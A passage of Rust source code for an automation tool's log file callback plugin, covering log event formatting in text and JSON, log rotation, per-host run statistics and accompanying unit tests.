success: bool },\n    /// Task execution started.\n    TaskStart {\n        name: String,\n        host: String,\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        module: Option\u003cString\u003e,\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        args: Option\u003cserde_json::Value\u003e,\n    },\n    /// Task execution completed on a host.\n    TaskResult {\n        host: String,\n        task_name: String,\n        status: String,\n        changed: bool,\n        duration_secs: Option\u003cf64\u003e,\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        message: Option\u003cString\u003e,\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        stdout: Option\u003cString\u003e,\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        stderr: Option\u003cString\u003e,\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        diff: Option\u003cString\u003e,\n    },\n    /// Handler was triggered.\n    HandlerTriggered { name: String },\n    /// Facts were gathered for a host.\n    FactsGathered { host: String, fact_count: usize },\n    /// Host became unreachable.\n    HostUnreachable {\n        host: String,\n        task_name: String,\n        error: String,\n    },\n    /// Warning message.\n    Warning { message: String },\n    /// Debug message.\n    Debug {\n        host: Option\u003cString\u003e,\n        message: String,\n    },\n}\n\n/// Per-host statistics for log summary.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct HostLogStats {\n    pub ok: u32,\n    pub changed: u32,\n    pub failed: u32,\n    pub skipped: u32,\n    pub unreachable: u32,\n}\n\n// ============================================================================\n// Log Entry\n// ============================================================================\n\n/// A timestamped log entry.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct LogEntry {\n    /// ISO 8601 timestamp.\n    pub timestamp: String,\n    /// The event data.\n    #[serde(flatten)]\n    pub event: LogEvent,\n}\n\nimpl LogEntry {\n    /// Creates a new log entry with the current timestamp.\n    fn new(event: LogEvent) -\u003e Self {\n        Self {\n            timestamp: Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true),\n            event,\n        }\n    }\n\n    /// Formats the entry as a human-readable log line.\n    fn format_human(\u0026self) -\u003e String {\n        let ts = \u0026self.timestamp;\n        match \u0026self.event {\n            LogEvent::PlaybookStart { playbook } =\u003e {\n                format!(\"[{}] PLAYBOOK START: {}\", ts, playbook)\n            }\n            LogEvent::PlaybookEnd {\n                playbook,\n                duration_secs,\n                success,\n                stats,\n            } =\u003e {\n                let status = if *success { \"SUCCESS\" } else { \"FAILED\" };\n                let mut lines = vec![format!(\n                    \"[{}] PLAYBOOK END: {} | {} | Duration: {:.3}s\",\n                    ts, playbook, status, duration_secs\n                )];\n\n                // Add per-host stats in sorted order\n                let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n                hosts.sort();\n                for host in hosts {\n                    if let Some(s) = stats.get(host) {\n                        lines.push(format!(\n                            \"[{}]   {}: ok={} changed={} failed={} skipped={} unreachable={}\",\n                            ts, host, s.ok, s.changed, s.failed, s.skipped, s.unreachable\n                        ));\n                    }\n                }\n                lines.join(\"\\n\")\n            }\n            LogEvent::PlayStart { name, hosts } =\u003e {\n                format!(\"[{}] PLAY START: {} | hosts: {}\", ts, name, hosts)\n            }\n            LogEvent::PlayEnd { name, success } =\u003e {\n                let status = if *success { \"SUCCESS\" } else { \"FAILED\" };\n                format!(\"[{}] PLAY END: {} | {}\", ts, name, status)\n            }\n            LogEvent::TaskStart {\n                name,\n                host,\n                module,\n                args,\n            } =\u003e {\n                let module_str = module.as_deref().unwrap_or(\"unknown\");\n                if let Some(args) = args {\n                    format!(\n                        \"[{}] TASK START: {} | host: {} | module: {} | args: {}\",\n                        ts,\n                        name,\n                        host,\n                        module_str,\n                        serde_json::to_string(args).unwrap_or_default()\n                    )\n                } else {\n                    format!(\n                        \"[{}] TASK START: {} | host: {} | module: {}\",\n                        ts, name, host, module_str\n                    )\n                }\n            }\n            LogEvent::TaskResult {\n                host,\n                task_name,\n                status,\n                changed,\n                duration_secs,\n                message,\n                stdout,\n                stderr,\n                diff,\n            } =\u003e {\n                let changed_str = if *changed { \" (changed)\" } else { \"\" };\n                let duration_str = duration_secs\n                    .map(|d| format!(\" ({:.3}s)\", d))\n                    .unwrap_or_default();\n                let mut line = format!(\n                    \"[{}] TASK RESULT: {} | {} | {}{}{}\",\n                    ts, host, task_name, status, changed_str, duration_str\n                );\n\n                if let Some(msg) = message {\n                    if !msg.is_empty() {\n                        line.push_str(\u0026format!(\"\\n[{}]   msg: {}\", ts, msg));\n                    }\n                }\n                if let Some(out) = stdout {\n                    if !out.is_empty() {\n                        line.push_str(\u0026format!(\"\\n[{}]   stdout: {}\", ts, out.trim()));\n                    }\n                }\n                if let Some(err) = stderr {\n                    if !err.is_empty() {\n                        line.push_str(\u0026format!(\"\\n[{}]   stderr: {}\", ts, err.trim()));\n                    }\n                }\n                if let Some(d) = diff {\n                    if !d.is_empty() {\n                        line.push_str(\u0026format!(\"\\n[{}]   diff:\\n{}\", ts, d));\n                    }\n                }\n                line\n            }\n            LogEvent::HandlerTriggered { name } =\u003e {\n                format!(\"[{}] HANDLER TRIGGERED: {}\", ts, name)\n            }\n            LogEvent::FactsGathered { host, fact_count } =\u003e {\n                format!(\"[{}] FACTS GATHERED: {} | {} facts\", ts, host, fact_count)\n            }\n            LogEvent::HostUnreachable {\n                host,\n                task_name,\n                error,\n            } =\u003e {\n                format!(\n                    \"[{}] HOST UNREACHABLE: {} | {} | {}\",\n                    ts, host, task_name, error\n                )\n            }\n            LogEvent::Warning { message } =\u003e {\n                format!(\"[{}] WARNING: {}\", ts, message)\n            }\n            LogEvent::Debug { host, message } =\u003e {\n                if let Some(h) = host {\n                    format!(\"[{}] DEBUG: {} | {}\", ts, h, message)\n                } else {\n                    format!(\"[{}] DEBUG: {}\", ts, message)\n                }\n            }\n        }\n    }\n\n    /// Formats the entry as a JSON line (JSONL format).\n    fn format_json(\u0026self) -\u003e String {\n        serde_json::to_string(self).unwrap_or_else(|_| \"{}\".to_string())\n    }\n}\n\n// ============================================================================\n// Internal State\n// ============================================================================\n\n/// Internal state for the log file callback.\n///\n/// Note: `Debug` is implemented manually since `BufWriter\u003cFile\u003e` doesn't implement `Debug`.\nstruct LogFileState {\n    /// Human-readable log file writer.\n    text_writer: Option\u003cBufWriter\u003cFile\u003e\u003e,\n    /// JSON log file writer (if enabled).\n    json_writer: Option\u003cBufWriter\u003cFile\u003e\u003e,\n    /// Path to the current text log file.\n    text_log_path: Option\u003cPathBuf\u003e,\n    /// Path to the current JSON log file.\n    json_log_path: Option\u003cPathBuf\u003e,\n    /// Playbook start time for duration tracking.\n    start_time: Option\u003cInstant\u003e,\n    /// Current playbook name.\n    playbook_name: Option\u003cString\u003e,\n    /// Per-host statistics.\n    host_stats: HashMap\u003cString, HostLogStats\u003e,\n    /// Whether any failures occurred.\n    has_failures: bool,\n    /// Current task name being executed.\n    current_task: Option\u003cString\u003e,\n}\n\nimpl std::fmt::Debug for LogFileState {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"LogFileState\")\n            .field(\n                \"text_writer\",\n                \u0026self.text_writer.as_ref().map(|_| \"\u003cBufWriter\u003e\"),\n            )\n            .field(\n                \"json_writer\",\n                \u0026self.json_writer.as_ref().map(|_| \"\u003cBufWriter\u003e\"),\n            )\n            .field(\"text_log_path\", \u0026self.text_log_path)\n            .field(\"json_log_path\", \u0026self.json_log_path)\n            .field(\"start_time\", \u0026self.start_time)\n            .field(\"playbook_name\", \u0026self.playbook_name)\n            .field(\"host_stats\", \u0026self.host_stats)\n            .field(\"has_failures\", \u0026self.has_failures)\n            .field(\"current_task\", \u0026self.current_task)\n            .finish()\n    }\n}\n\nimpl LogFileState {\n    fn new() -\u003e Self {\n        Self {\n            text_writer: None,\n            json_writer: None,\n            text_log_path: None,\n            json_log_path: None,\n            start_time: None,\n            playbook_name: None,\n            host_stats: HashMap::new(),\n            has_failures: false,\n            current_task: None,\n        }\n    }\n\n    #[allow(dead_code)]\n    fn reset(\u0026mut self) {\n        self.text_writer = None;\n        self.json_writer = None;\n        self.text_log_path = None;\n        self.json_log_path = None;\n        self.start_time = None;\n        self.playbook_name = None;\n        self.host_stats.clear();\n        self.has_failures = false;\n        self.current_task = None;\n    }\n}\n\n// ============================================================================\n// LogFileCallback Implementation\n// ============================================================================\n\n/// Log file callback plugin that writes execution logs to files.\n///\n/// This callback creates separate log files for each playbook run,\n/// with support for both human-readable and JSON formats, plus\n/// automatic log rotation.\n///\n/// # Thread Safety\n///\n/// This callback is safe for concurrent access from multiple tasks.\n/// All state is protected by a `RwLock`.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::logfile::{LogFileCallback, LogFileConfig};\n///\n/// // Create with default config (logs to ./logs)\n/// let callback = LogFileCallback::new(LogFileConfig::default())?;\n///\n/// // Or with custom config\n/// let config = LogFileConfig::builder()\n///     .log_directory(\"/var/log/rustible\")\n///     .json_format(true)\n///     .max_log_files(30)\n///     .build();\n/// let callback = LogFileCallback::new(config)?;\n/// ```\n#[derive(Debug)]\npub struct LogFileCallback {\n    /// Configuration for the callback.\n    config: LogFileConfig,\n    /// Internal state protected by RwLock.\n    state: RwLock\u003cLogFileState\u003e,\n}\n\nimpl LogFileCallback {\n    /// Creates a new log file callback with the given configuration.\n    ///\n    /// This will create the log directory if it doesn't exist and\n    /// perform log rotation based on the configuration.\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if the log directory cannot be created.\n    pub fn new(config: LogFileConfig) -\u003e std::io::Result\u003cSelf\u003e {\n        // Ensure log directory exists\n        fs::create_dir_all(\u0026config.log_directory)?;\n\n        let callback = Self {\n            config,\n            state: RwLock::new(LogFileState::new()),\n        };\n\n        // Perform initial rotation\n        callback.rotate_logs()?;\n\n        Ok(callback)\n    }\n\n    /// Creates a new log file callback with default configuration.\n    ///\n    /// Logs are written to `./logs` directory.\n    pub fn with_defaults() -\u003e std::io::Result\u003cSelf\u003e {\n        Self::new(LogFileConfig::default())\n    }\n\n    /// Returns the path to the current text log file, if any.\n    pub fn current_log_path(\u0026self) -\u003e Option\u003cPathBuf\u003e {\n        self.state.read().text_log_path.clone()\n    }\n\n    /// Returns the path to the current JSON log file, if any.\n    pub fn current_json_log_path(\u0026self) -\u003e Option\u003cPathBuf\u003e {\n        self.state.read().json_log_path.clone()\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.state.read().has_failures\n    }\n\n    /// Returns the current host statistics.\n    pub fn get_stats(\u0026self) -\u003e HashMap\u003cString, HostLogStats\u003e {\n        self.state.read().host_stats.clone()\n    }\n\n    /// Performs log rotation based on configuration.\n    fn rotate_logs(\u0026self) -\u003e std::io::Result\u003c()\u003e {\n        if self.config.max_log_files == 0 \u0026\u0026 self.config.max_log_age_days == 0 {\n            return Ok(()); // No rotation configured\n        }\n\n        let log_dir = \u0026self.config.log_directory;\n        if !log_dir.exists() {\n            return Ok(());\n        }\n\n        // Collect log files with their metadata\n        let mut log_files: Vec\u003c(PathBuf, std::time::SystemTime)\u003e = Vec::new();\n\n        for entry in fs::read_dir(log_dir)? {\n            let entry = entry?;\n            let path = entry.path();\n\n            // Only consider files matching our prefix\n            if let Some(name) = path.file_name().and_then(|n| n.to_str()) {\n                if name.starts_with(\u0026self.config.log_prefix)\n                    \u0026\u0026 (name.ends_with(\".log\") || name.ends_with(\".json\"))\n                {\n                    if let Ok(metadata) = entry.metadata() {\n                        if let Ok(modified) = metadata.modified() {\n                            log_files.push((path, modified));\n                        }\n                    }\n                }\n            }\n        }\n\n        // Sort by modification time (oldest first)\n        log_files.sort_by(|a, b| a.1.cmp(\u0026b.1));\n\n        let now = std::time::SystemTime::now();\n\n        // Remove files by age\n        if self.config.max_log_age_days \u003e 0 {\n            let max_age = Duration::from_secs(self.config.max_log_age_days as u64 * 24 * 60 * 60);\n            log_files.retain(|(path, modified)| {\n                if let Ok(age) = now.duration_since(*modified) {\n                    if age \u003e max_age {\n                        let _ = fs::remove_file(path);\n                        return false;\n                    }\n                }\n                true\n            });\n        }\n\n        // Remove excess files by count (keep newest)\n        // Note: We count .log and .json pairs as one file set\n        if self.config.max_log_files \u003e 0 {\n            // Group by base name (without extension)\n            let mut base_names: Vec\u003cString\u003e = log_files\n                .iter()\n                .filter_map(|(path, _)| path.file_stem().and_then(|s| s.to_str()).map(String::from))\n                .collect();\n            base_names.sort();\n            base_names.dedup();\n\n            if base_names.len() \u003e self.config.max_log_files {\n                let to_remove = base_names.len() - self.config.max_log_files;\n                for base in base_names.iter().take(to_remove) {\n                    let text_path = log_dir.join(format!(\"{}.log\", base));\n                    let json_path = log_dir.join(format!(\"{}.json\", base));\n                    let _ = fs::remove_file(text_path);\n                    let _ = fs::remove_file(json_path);\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Generates a unique log file name for the current run.\n    fn generate_log_filename(\u0026self, playbook_name: \u0026str) -\u003e String {\n        let timestamp = Utc::now().format(\"%Y%m%d_%H%M%S\");\n        let sanitized_playbook = playbook_name\n            .replace(['/', '\\\\', ' ', '.'], \"_\")\n            .chars()\n            .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')\n            .collect::\u003cString\u003e();\n\n        format!(\n            \"{}_{}_{}\",\n            self.config.log_prefix, sanitized_playbook, timestamp\n        )\n    }\n\n    /// Opens log files for a new playbook run.\n    fn open_log_files(\u0026self, playbook_name: \u0026str) -\u003e std::io::Result\u003c()\u003e {\n        let base_name = self.generate_log_filename(playbook_name);\n        let text_path = self.config.log_directory.join(format!(\"{}.log\", base_name));\n\n        let text_file = OpenOptions::new()\n            .create(true)\n            .write(true)\n            .append(self.config.append)\n            .truncate(!self.config.append)\n            .open(\u0026text_path)?;\n\n        let mut state = self.state.write();\n        state.text_writer = Some(BufWriter::new(text_file));\n        state.text_log_path = Some(text_path);\n\n        if self.config.json_format {\n            let json_path = self\n                .config\n                .log_directory\n                .join(format!(\"{}.json\", base_name));\n            let json_file = OpenOptions::new()\n                .create(true)\n                .write(true)\n                .append(self.config.append)\n                .truncate(!self.config.append)\n                .open(\u0026json_path)?;\n\n            state.json_writer = Some(BufWriter::new(json_file));\n            state.json_log_path = Some(json_path);\n        }\n\n        Ok(())\n    }\n\n    /// Writes a log entry to the log files.\n    fn write_entry(\u0026self, entry: LogEntry) {\n        let mut state = self.state.write();\n\n        // Write human-readable format\n        if let Some(ref mut writer) = state.text_writer {\n            let line = entry.format_human();\n            if writeln!(writer, \"{}\", line).is_ok() \u0026\u0026 self.config.flush_immediately {\n                let _ = writer.flush();\n            }\n        }\n\n        // Write JSON format\n        if let Some(ref mut writer) = state.json_writer {\n            let line = entry.format_json();\n            if writeln!(writer, \"{}\", line).is_ok() \u0026\u0026 self.config.flush_immediately {\n                let _ = writer.flush();\n            }\n        }\n    }\n\n    /// Flushes and closes the current log files.\n    fn close_log_files(\u0026self) {\n        let mut state = self.state.write();\n\n        if let Some(ref mut writer) = state.text_writer {\n            let _ = writer.flush();\n        }\n        state.text_writer = None;\n\n        if let Some(ref mut writer) = state.json_writer {\n            let _ = writer.flush();\n        }\n        state.json_writer = None;\n    }\n\n    /// Checks if the given result should be logged based on log level.\n    fn should_log_result(\u0026self, result: \u0026ExecutionResult) -\u003e bool {\n        match self.config.log_level.as_str() {\n            \"failures\" =\u003e !result.result.success,\n            \"changes\" =\u003e result.result.changed || !result.result.success,\n            _ =\u003e true, // \"all\" or unknown\n        }\n    }\n\n    /// Logs a warning message.\n    pub fn log_warning(\u0026self, message: \u0026str) {\n        self.write_entry(LogEntry::new(LogEvent::Warning {\n            message: message.to_string(),\n        }));\n    }\n\n    /// Logs a debug message.\n    pub fn log_debug(\u0026self, host: Option\u003c\u0026str\u003e, message: \u0026str) {\n        self.write_entry(LogEntry::new(LogEvent::Debug {\n            host: host.map(String::from),\n            message: message.to_string(),\n        }));\n    }\n\n    /// Logs a host unreachable event.\n    pub fn log_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        // Update stats\n        {\n            let mut state = self.state.write();\n            let host_stats = state.host_stats.entry(host.to_string()).or_default();\n            host_stats.unreachable += 1;\n            state.has_failures = true;\n        }\n\n        self.write_entry(LogEntry::new(LogEvent::HostUnreachable {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            error: error.to_string(),\n        }));\n    }\n}\n\n// ============================================================================\n// ExecutionCallback Implementation\n// ============================================================================\n\n#[async_trait]\nimpl ExecutionCallback for LogFileCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        // Perform rotation before starting new log\n        let _ = self.rotate_logs();\n\n        // Open new log files\n        if let Err(e) = self.open_log_files(name) {\n            eprintln!(\"Warning: Failed to open log files: {}\", e);\n            return;\n        }\n\n        // Initialize state\n        {\n            let mut state = self.state.write();\n            state.start_time = Some(Instant::now());\n            state.playbook_name = Some(name.to_string());\n            state.host_stats.clear();\n            state.has_failures = false;\n        }\n\n        // Write playbook start entry\n        self.write_entry(LogEntry::new(LogEvent::PlaybookStart {\n            playbook: name.to_string(),\n        }));\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let (duration, stats) = {\n            let state = self.state.read();\n            let duration = state\n                .start_time\n                .map(|s| s.elapsed().as_secs_f64())\n                .unwrap_or(0.0);\n            (duration, state.host_stats.clone())\n        };\n\n        self.write_entry(LogEntry::new(LogEvent::PlaybookEnd {\n            playbook: name.to_string(),\n            duration_secs: duration,\n            success,\n            stats,\n        }));\n\n        self.close_log_files();\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Initialize host stats for all hosts in this play\n        {\n            let mut state = self.state.write();\n            for host in hosts {\n                state.host_stats.entry(host.clone()).or_default();\n            }\n        }\n\n        self.write_entry(LogEntry::new(LogEvent::PlayStart {\n            name: name.to_string(),\n            hosts: hosts.join(\", \"),\n        }));\n    }\n\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        self.write_entry(LogEntry::new(LogEvent::PlayEnd {\n            name: name.to_string(),\n            success,\n        }));\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        // Store current task name for later reference\n        {\n            let mut state = self.state.write();\n            state.current_task = Some(name.to_string());\n        }\n\n        self.write_entry(LogEntry::new(LogEvent::TaskStart {\n            name: name.to_string(),\n            host: host.to_string(),\n            module: None,\n            args: None,\n        }));\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Check log level filter\n        if !self.should_log_result(result) {\n            // Still update stats even if not logging\n            let mut state = self.state.write();\n            let host_stats = state.host_stats.entry(result.host.clone()).or_default();\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n                state.has_failures = true;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n            return;\n        }\n\n        let status = if result.result.skipped {\n            \"SKIPPED\"\n        } else if !result.result.success {\n            \"FAILED\"\n        } else if result.result.changed {\n            \"CHANGED\"\n        } else {\n            \"OK\"\n        };\n\n        // Update stats\n        {\n            let mut state = self.state.write();\n            let host_stats = state.host_stats.entry(result.host.clone()).or_default();\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n                state.has_failures = true;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Build the log entry\n        let message = if result.result.message.is_empty() {\n            None\n        } else {\n            Some(result.result.message.clone())\n        };\n\n        // Extract stdout/stderr from data if available and configured\n        let (stdout, stderr) = if self.config.include_output {\n            if let Some(ref data) = result.result.data {\n                let stdout = data\n                    .get(\"stdout\")\n                    .and_then(|v| v.as_str())\n                    .map(String::from);\n                let stderr = data\n                    .get(\"stderr\")\n                    .and_then(|v| v.as_str())\n                    .map(String::from);\n                (stdout, stderr)\n            } else {\n                (None, None)\n            }\n        } else {\n            (None, None)\n        };\n\n        // Extract diff if available and configured\n        let diff = if self.config.include_diffs {\n            if let Some(ref data) = result.result.data {\n                data.get(\"diff\")\n                    .and_then(|v| serde_json::to_string_pretty(v).ok())\n            } else {\n                None\n            }\n        } else {\n            None\n        };\n\n        self.write_entry(LogEntry::new(LogEvent::TaskResult {\n            host: result.host.clone(),\n            task_name: result.task_name.clone(),\n            status: status.to_string(),\n            changed: result.result.changed,\n            duration_secs: Some(result.duration.as_secs_f64()),\n            message,\n            stdout,\n            stderr,\n            diff,\n        }));\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        self.write_entry(LogEntry::new(LogEvent::HandlerTriggered {\n            name: name.to_string(),\n        }));\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        let fact_count = facts.all().len();\n\n        self.write_entry(LogEntry::new(LogEvent::FactsGathered {\n            host: host.to_string(),\n            fact_count,\n        }));\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::path::Path;\n    use std::time::Duration;\n    use tempfile::TempDir;\n\n    fn create_test_config(dir: \u0026Path) -\u003e LogFileConfig {\n        LogFileConfig {\n            log_directory: dir.to_path_buf(),\n            json_format: true,\n            max_log_files: 5,\n            max_log_age_days: 0,\n            log_prefix: \"test\".to_string(),\n            include_task_args: false,\n            include_output: true,\n            include_diffs: false,\n            flush_immediately: true,\n            append: false,\n            log_level: \"all\".to_string(),\n        }\n    }\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_config_builder() {\n        let config = LogFileConfig::builder()\n            .log_directory(\"/var/log/test\")\n            .json_format(true)\n            .max_log_files(10)\n            .log_prefix(\"custom\")\n            .include_task_args(true)\n            .log_level(\"failures\")\n            .build();\n\n        assert_eq!(config.log_directory, PathBuf::from(\"/var/log/test\"));\n        assert!(config.json_format);\n        assert_eq!(config.max_log_files, 10);\n        assert_eq!(config.log_prefix, \"custom\");\n        assert!(config.include_task_args);\n        assert_eq!(config.log_level, \"failures\");\n    }\n\n    #[test]\n    fn test_config_default() {\n        let config = LogFileConfig::default();\n\n        assert_eq!(config.log_directory, PathBuf::from(\"./logs\"));\n        assert!(!config.json_format);\n        assert_eq!(config.max_log_files, 50);\n        assert_eq!(config.log_prefix, \"rustible\");\n        assert_eq!(config.log_level, \"all\");\n    }\n\n    #[test]\n    fn test_log_entry_format_human() {\n        let entry = LogEntry::new(LogEvent::PlaybookStart {\n            playbook: \"test.yml\".to_string(),\n        });\n\n        let formatted = entry.format_human();\n        assert!(formatted.contains(\"PLAYBOOK START\"));\n        assert!(formatted.contains(\"test.yml\"));\n    }\n\n    #[test]\n    fn test_log_entry_format_json() {\n        let entry = LogEntry::new(LogEvent::PlaybookStart {\n            playbook: \"test.yml\".to_string(),\n        });\n\n        let formatted = entry.format_json();\n        let parsed: serde_json::Value = serde_json::from_str(\u0026formatted).unwrap();\n\n        assert_eq!(parsed[\"event\"], \"playbook_start\");\n        assert_eq!(parsed[\"playbook\"], \"test.yml\");\n        assert!(parsed[\"timestamp\"].is_string());\n    }\n\n    #[test]\n    fn test_log_entry_task_result_format() {\n        let entry = LogEntry::new(LogEvent::TaskResult {\n            host: \"webserver1\".to_string(),\n            task_name: \"Install nginx\".to_string(),\n            status: \"CHANGED\".to_string(),\n            changed: true,\n            duration_secs: Some(1.234),\n            message: Some(\"Package installed\".to_string()),\n            stdout: None,\n            stderr: None,\n            diff: None,\n        });\n\n        let formatted = entry.format_human();\n        assert!(formatted.contains(\"webserver1\"));\n        assert!(formatted.contains(\"Install nginx\"));\n        assert!(formatted.contains(\"CHANGED\"));\n        assert!(formatted.contains(\"1.234s\"));\n    }\n\n    #[tokio::test]\n    async fn test_callback_creates_log_files() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = create_test_config(temp_dir.path());\n\n        let callback = LogFileCallback::new(config).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n\n        // Verify log files were created\n        assert!(callback.current_log_path().is_some());\n        assert!(callback.current_json_log_path().is_some());\n\n        // Verify files exist\n        let log_path = callback.current_log_path().unwrap();\n        let json_path = callback.current_json_log_path().unwrap();\n        assert!(log_path.exists());\n        assert!(json_path.exists());\n\n        callback.on_playbook_end(\"test-playbook\", true).await;\n    }\n\n    #[tokio::test]\n    async fn test_callback_writes_entries() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = create_test_config(temp_dir.path());\n\n        let callback = LogFileCallback::new(config).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"Test Play\", \u0026[\"host1\".to_string()])\n            .await;\n        callback.on_task_start(\"Install package\", \"host1\").await;\n\n        let result = create_execution_result(\"host1\", \"Install package\", true, true, false, \"ok\");\n        callback.on_task_complete(\u0026result).await;\n\n        callback.on_play_end(\"Test Play\", true).await;\n        callback.on_playbook_end(\"test-playbook\", true).await;\n\n        // Read and verify log content\n        let log_path = callback.current_log_path().unwrap();\n        let content = fs::read_to_string(\u0026log_path).unwrap();\n\n        assert!(content.contains(\"PLAYBOOK START\"));\n        assert!(content.contains(\"PLAY START\"));\n        assert!(content.contains(\"TASK START\"));\n        assert!(content.contains(\"TASK RESULT\"));\n        assert!(content.contains(\"PLAYBOOK END\"));\n    }\n\n    #[tokio::test]\n    async fn test_callback_tracks_stats() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = create_test_config(temp_dir.path());\n\n        let callback = LogFileCallback::new(config).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"Test Play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate various results\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result = create_execution_result(\"host2\", \"task1\", false, false, false, \"error\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let stats = callback.get_stats();\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n\n        assert!(callback.has_failures());\n\n        callback.on_playbook_end(\"test-playbook\", false).await;\n    }\n\n    #[test]\n    fn test_generate_log_filename() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = create_test_config(temp_dir.path());\n        let callback = LogFileCallback::new(config).unwrap();\n\n        let filename = callback.generate_log_filename(\"deploy.yml\");\n        assert!(filename.starts_with(\"test_deploy_yml_\"));\n        assert!(!filename.contains('/'));\n        assert!(!filename.contains('\\\\'));\n    }\n\n    #[test]\n    fn test_log_rotation() {\n        let temp_dir = TempDir::new().unwrap();\n        let log_dir = temp_dir.path();\n\n        // Create some old log files\n        for i in 0..10 {\n            let path = log_dir.join(format!(\"test_playbook_{:02}.log\", i));\n            fs::write(\u0026path, \"test content\").unwrap();\n            let json_path = log_dir.join(format!(\"test_playbook_{:02}.json\", i));\n            fs::write(\u0026json_path, \"{}\").unwrap();\n        }\n\n        // Create callback with max 5 files\n        let config = LogFileConfig {\n            log_directory: log_dir.to_path_buf(),\n            max_log_files: 5,\n            log_prefix: \"test\".to_string(),\n            ..Default::default()\n        };\n\n        let _callback = LogFileCallback::new(config).unwrap();\n\n        // Count remaining files\n        let count = fs::read_dir(log_dir)\n            .unwrap()\n            .filter_map(|e| e.ok())\n            .filter(|e| {\n                e.path()\n                    .extension()\n                    .map(|ext| ext == \"log\")\n                    .unwrap_or(false)\n            })\n            .count();\n\n        // Should have at most 5 log files (rotation happened)\n        assert!(count \u003c= 5, \"Expected at most 5 log files, found {}\", count);\n    }\n\n    #[test]\n    fn test_host_log_stats_default() {\n        let stats = HostLogStats::default();\n        assert_eq!(stats.ok, 0);\n        assert_eq!(stats.changed, 0);\n        assert_eq!(stats.failed, 0);\n        assert_eq!(stats.skipped, 0);\n        assert_eq!(stats.unreachable, 0);\n    }\n\n    #[tokio::test]\n    async fn test_log_level_filter() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = LogFileConfig {\n            log_directory: temp_dir.path().to_path_buf(),\n            log_level: \"failures\".to_string(),\n            json_format: false,\n            ..Default::default()\n        };\n\n        let callback = LogFileCallback::new(config).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"Test Play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // OK result should not be logged\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        // Changed result should not be logged (only failures)\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        